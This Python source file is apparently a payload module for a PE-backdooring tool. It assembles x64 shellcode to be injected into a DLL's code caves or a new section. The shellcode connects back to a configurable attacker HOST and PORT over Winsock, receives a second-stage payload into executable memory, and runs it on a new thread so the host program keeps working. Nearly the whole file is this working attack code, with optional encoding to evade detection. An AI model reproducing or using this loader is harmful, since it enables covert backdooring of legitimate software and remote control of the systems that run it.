import struct
import os
import logging
from core import enum
from core import support

from pe.core import eat_code_caves
from common import common
logger = logging.getLogger(__name__)

class text_loader_dll_reverse_tcp_staged_threaded():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "text_loader_dll_reverse_tcp_staged_threaded"
        self.description = """Import Address Table reverse tcp staged payload"""
        self.requirements = {'MODE': 'How the patching will happen',
                             'HOST': '<HOST to connect back to>',
                             'PORT': '<Port to connect back to>',
                             'IDT_IN_CAVE': 'Put new imports in a existing cave',
                             'ENCODER': '<Encoder you want to use, else none>'
                             }
        self.supported_modes = ['dll_loader_single_cave',
                                'dll_loader_payload_splitting',
                                'dll_loader_add_section',
                                'cfg_dll_loader_add_section',
                                'cfg_dll_loader_single_cave',
                                'cfg_dll_loader_payload_splitting'
                                ]
        self.shellcode = ""
        self.stackpreserve = bytes("\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              "\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              , 'iso-8859-1')
        self.stackrestore = bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             "\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58", 'iso-8859-1'
                             )
        self.apis_needed = [b'LoadLibraryA', b'GetProcAddress',
                            b'VirtualAlloc', b'CreateThread']
        self.payload_type = 'text_loader'

    def invoke(self, PM):
        # Expose patching method objects
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        if support.support(self).check_reqs() is False:
            return False
        return self.run()

    def run(self):
        """
        Completed IAT based payload includes spawning of thread.
        """

        for api in self.apis_needed:
            if api not in self.PM.BDF.pe_object:
                logger.error(f"API not found: {api}")
                return False
        # RCX holds the DLL imagebase
        self.payload_stub = b"\xfc"                   # CLD 
        self.payload_stub += b"\x55\x48\x89\xE5"       # mov rbp, rsp
        self.payload_stub += b"\x48\x89\xCA"            # mov rdx, rcx
        # rdx now module entry
        # ===
        # I have the location in memory coming into this

        self.payload_stub += b"\x49\xBE"               # mov value below to r14
        if self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.payload_stub += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.payload_stub += struct.pack("<Q", self.PM.BDF.pe_object[b'LoadLibraryA'] - self.PM.BDF.pe_object['ImageBase'])
        #RDX holds entry point
        self.payload_stub += b"\x49\x01\xD6"           # add r14 + RDX
        self.payload_stub += b"\x49\xBF"               # mov value below to r15
        if self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.payload_stub += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.payload_stub += struct.pack("<Q", self.PM.BDF.pe_object[b'GetProcAddress'] - self.PM.BDF.pe_object['ImageBase'])
        self.payload_stub += b"\x49\x01\xD7"           # add r15 + RDX
        # LoadLibraryA in r14
        # GetProcAddress in r15
        # put DLL imagebase in rbx
        self.payload_stub += b"\x48\x89\xD3"                                   # mov rbx, rdx

        self.payload_stub += bytes("\x49\xbb\x77\x73\x32\x5F\x33\x32\x00\x00"  # mov r11, ws2_32
                            "\x41\x53"                                         # push r11
                            "\x49\x89\xE3"                                     # mov r11, rsp
                            "\x48\x81\xEC\xA0\x01\x00\x00"                     # sub rsp, 408+8     # size of WSAData
                            "\x48\x89\xE6"                                     # mov rsi, rsp pointer to WSAData struct
                            "\x48\xBF\x02\x00"
                            , 'iso-8859-1')
        self.payload_stub += struct.pack('!H', int(self.PORT))
        self.payload_stub += common.pack_ip_addresses(self.HOST)
        self.payload_stub += bytes("\x57"                                      # push rdi
                            "\x48\x89\xE7"                                     # mov rdi, rsp pointer to data
                            "\x4C\x89\xD9"                                     # mov rcx, r11 #ws2_32
                            "\x48\x83\xEC\x20"                                 # sub rsp, 0x20
                            "\x41\xff\x16"                                     # call qword ptr [r14] ; LoadLibA
                            "\x49\x89\xC5"                                     # mov r13, rax ; handle ws2_32 to r13
                            #  handle ws2_32 to r13
                            "\x48\x89\xC1"                                   # mov rcx, rax
                            "\xeb\x0c"                                       # short jmp over api
                            "\x57\x53\x41\x53\x74\x61"                       # WSAStartup
                            "\x72\x74\x75\x70\x00\x00"                       # ...
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # Call qword ptr [r15] ; GetProcAddr
                            "\x48\x95"                                       # xchg rbp, rax ; mov wsastartup to rbp
                            # wsastartup to rbp
                            "\xeb\x0c"                                       # jmp over WSASocketA
                            "\x57\x53\x41\x53\x6f\x63"                       # WSASocketA
                            "\x6b\x65\x74\x41\x00\x00"                       #
                            "\x48\x8D\x15\xED\xFF\xFF\xFF"                   # lea rdx, [rip-19]
                            "\x4C\x89\xE9"                                   # mov rcx, r13
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] GetProcAddr WSASocketA
                            "\x49\x94"                                       # xchg r12, rax ; mov WSASocketA to r12
                            # WSASocketA to r12
                            "\x48\x89\xF2"                                   # mov rdx, rsi ; mov point to struct
                            "\x68\x01\x01\x00\x00"                           # push 0x0101
                            "\x59"                                           # pop rcx
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20

                            "\xff\xd5"                                       # call rbp ; WSAStartup(0x0101, &WSAData);

                            "\x50"                                           # push rax
                            "\x50"                                           # push rax
                            "\x4D\x31\xC0"                                   # xor r8, r8
                            "\x4D\x31\xC9"                                   # xor r9, r9
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC2"                                   # mov rdx, rax
                            "\x48\xff\xC0"                                   # inc rax
                            "\x48\x89\xC1"                                   # mov rdx, rax
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\xD4"                                   # call r12 ;WSASocketA(AF_INT, SOCK_STREAM, 0 0 0 0)
                            "\x49\x94"                                       # xchg r12, rax ; mov socket to r12
                            # get connect
                            "\x48\xBA\x63\x6F\x6E\x6E\x65\x63\x74\x00"       # mov rdx, "connect\x00"
                            "\x52"                                           # push rdx
                            "\x48\x89\xE2"                                   # mov rdx, rsp
                            "\x4C\x89\xE9"                                   # mov rcx, r13; ws2_32 handle
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            "\x41\xFF\x17"                                   # call qword ptr [r15] ;GetProcAddr connect
                            #"\x48\x89\xC3"                                   # mov rbx, rax ;connect api
                            "\x6A\x10"                                       # push 16
                            "\x41\x58"                                       # pop r8
                            "\x48\x89\xFA"                                   # mov rdx, rdi
                            "\x4C\x89\xE1"                                   # mov rcx, r12
                            "\x48\x83\xEC\x20"                               # sub rsp, 0x20
                            #"\xFF\xD3"                                       # call rbx ;connect (s, &sockaddr, 16)
                            "\xFF\xD0"                                       # call rax, connect (s, &sockaddr, 16)
                            , 'iso-8859-1')
        # socket is in r12
        # rdi has the struct for the socket
        # r14: LoadLibraryA
        # r15: GetProcAddress
        # r13 has ws2_32 handle
        # reminder: RCX, RDX, R8, R9 for the first four integer or pointer arguments
        self.payload_stub += bytes("\x90\x90\x90\x90"
                            #get recv handle
                            "\x4C\x89\xE9"                                  # mov rcx, r13 ; ws2_32 handle in rcx
                            "\x48\xBA\x72\x65\x63\x76\x00\x00\x00\x00"      # mov rdx, recv
                            "\x52"                                          # push rdx
                            "\x48\x89\xe2"                                  # mov rdx, rsp
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17"                                  # call qword ptr [r15]; getprocaddr recv
                            "\x49\x89\xC5"                                  # mov r13, rax ; don't need ws2_32 handle
                            "\x48\x81\xC4\xD0\x02\x00\x00"                  # add rsp, 0x2F8
                            "\x48\x83\xec\x10"                              # sub rsp, 16
                            "\x48\x89\xe2"                                  # mov rdx, rsp
                            "\x4D\x31\xC9"                                  # xor r9, r9
                            "\x6a\x04"                                      # push byte 0x4
                            "\x41\x58"                                      # pop r8
                            "\x4C\x89\xE1"                                  # mov rcx, r12; socket
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\xD5"                                  # call r13; recv
                            "\x48\x83\xC4\x20"                              # add rsp, 32 ;need to restore the stack
                            "\x5e"                                          # pop rsi ; size of second stage
                            , 'iso-8859-1')
        
        self.payload_stub += b"\x48\x89\xDA"                                # mov rdx, rbx
        # rdx has DLL image base
        self.payload_stub += b"\x49\xBE"                                       # mov value below to r14

        if self.PM.BDF.pe_object[b'VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] < 0:
            self.payload_stub += struct.pack("<Q", 0xffffffff + (self.PM.BDF.pe_object[b'VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'] + 1))
        else:
            self.payload_stub += struct.pack("<Q", self.PM.BDF.pe_object[b'VirtualAlloc'] - self.PM.BDF.pe_object['ImageBase'])
        self.payload_stub += b"\x49\x01\xD6"  # add r14 + RDX
        # r14 now holds VirtualAlloc

        self.payload_stub += bytes("\x6a\x40"                                      # push byte 0x40
                            "\x41\x59"                                      # pop r9
                            "\x68\x00\x10\x00\x00"                          # push 0x1000
                            "\x41\x58"                                      # pop r8
                            "\x48\x89\xf2"                                  # mov rdx, rsi
                            "\x48\x31\xc9"                                  # xor rcx, rcx
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xff\x16"                                  # call r14; call VirtualAlloc
                            "\x48\x89\xc3"                                  # mov rbx, rax
                            "\x49\x89\xC7"                                  # mov r15, rax
                            "\x4D\x31\xC9"                                  # xor r9, r9
                            "\x49\x89\xF0"                                  # mov r8, rsi
                            "\x48\x89\xDA"                                  # mov rdx, rbx
                            "\x4C\x89\xE1"                                  # mov rcx, r12
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\xD5"                                  # call r13; recv
                            "\x48\x01\xC3"                                  # add rbx, rax
                            "\x48\x29\xC6"                                  # sub rsi, rax
                            "\x48\x85\xF6"                                  # test rsi, rsi
                            "\x75\xe2"                                      # jnz short -X
                            "\x4C\x89\xE7"                                  # mov rdi, r12 ; socket to rdi
                            "\x41\xFF\xE7"                                  # jmp r15
                            , 'iso-8859-1')

        # BEGIN THREAD STUB
        self.thread_stub = b"\xe8\x00\x00\x00\x00"                           # call self
        self.thread_stub += b"\x5B"                                          # pop rbx; addresss to rbx
        self.thread_stub += b"\x48\x83\xC3\x3e"                                  # add len of self.thread_stub to rbx

        # r12 has DLL base addr
        self.thread_stub += bytes(
                            "\x48\x31\xC0"                                  # xor rax,rax
                            "\x50"                                          # push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                          # push rax          ; DWORD dwCreationFlags (0)
                            "\x4D\x89\xE1"                                  # mov r9, r12         ; LPVOID lpParameter DLL Base addr ptr
                            "\x48\x89\xC2"                                  # mov rdx, rax        ; SIZE_T dwStackSize (0 for default) 
                            "\x49\x89\xD8"                                  # mov r8, rbx         ; SLPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x48\x89\xC1"                                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x48\x83\xEC\x20"                              # sub rsp, 0x20
                            "\x41\xFF\x17",                                 # call qword ptr [r15]
                            'iso-8859-1'
                            )

        self.thread_stub += b"\x48\x83\xC4\x48"
                            #stackrestore
        self.thread_stub += bytes("\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58",
                            'iso-8859-1')
        self.thread_stub += b"\xe9"
        self.thread_stub += struct.pack("<I", len(self.payload_stub))

        # ENCODER WORKFLOW
        if self.PM.found_encoder:
            logger.debug(f'Len payload_stub before encoding: {len(self.payload_stub)}')

            decoding_stub, encoded_stub = self.PM.found_encoder.run(self.thread_stub + self.payload_stub, self.BDF)
            self.payload_stub = decoding_stub + encoded_stub
            logger.debug(f'Len payload after encoding: {len(self.payload_stub)}')

            self.PM.BDF.pe_object['payload_stub'] = self.payload_stub
            self.shellcode = self.payload_stub

        else:

            # note these are not encoded...
            self.PM.BDF.pe_object['thread_stub'] = self.thread_stub
            logger.info(f"CreateThread stub len: {hex(len(self.BDF.pe_object['thread_stub']))}, {len(self.BDF.pe_object['thread_stub'])}")

            self.PM.BDF.pe_object['payload_stub'] = self.payload_stub
            self.shellcode = self.thread_stub + self.payload_stub

        # END ENCODER

        return (self.shellcode, )    
